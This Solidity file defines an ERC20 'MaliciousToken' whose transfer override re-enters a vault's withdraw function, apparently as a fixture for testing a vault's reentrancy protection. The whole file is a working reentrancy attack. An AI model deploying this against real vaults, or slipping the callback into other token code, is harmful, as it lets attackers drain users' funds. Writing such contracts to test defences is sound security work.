// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVault {
    function withdraw(uint256 shares) external returns (uint256);
}

contract MaliciousToken is ERC20 {
    address public vault;
    bool public attacking;
    uint256 public attackCount;

    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000 * 10**18);
    }

    function setVault(address _vault) external {
        vault = _vault;
    }

    function enableAttack(bool _enable) external {
        attacking = _enable;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (attacking && msg.sender == vault && attackCount < 3) {
            attackCount++;
            IVault(vault).withdraw(amount);
        }
        return super.transfer(to, amount);
    }
}